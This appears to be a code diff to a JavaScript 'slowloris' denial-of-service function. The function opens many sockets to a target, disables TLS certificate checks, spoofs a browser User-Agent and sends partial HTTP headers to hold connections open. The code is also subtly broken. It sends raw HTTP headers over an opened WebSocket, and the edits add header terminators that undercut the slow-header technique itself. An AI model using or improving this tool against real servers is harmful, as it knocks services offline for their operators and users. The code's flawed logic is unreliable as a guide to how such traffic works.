@@ -31,7 +31,7 @@ function slowloris(target, numSockets) {
                 const protocol = isSecure ? 'wss:' : 'ws:';
                 socket = new WebSocket(`${protocol}//${hostname}:${port}${path}`, {
                     origin: `${protocol}//${hostname}`,
-                    rejectUnauthorized: false,
+                    rejectUnauthorized: false
                 });
 
                 sockets[index] = socket;
@@ -69,7 +69,7 @@ function slowloris(target, numSockets) {
         }
 
         function sendInitialHeader(socket, hostname, path) {
-            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n`;
+            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
             try {
                 if (socket && socket.readyState === WebSocket.OPEN) {
                     socket.send(initialHeader);
@@ -84,7 +84,7 @@ function slowloris(target, numSockets) {
         }
 
         function sendKeepAliveHeader(socket) {
-            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
+            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
             try {
                 if (socket && socket.readyState === WebSocket.OPEN) {
                     socket.send(keepAliveHeader);
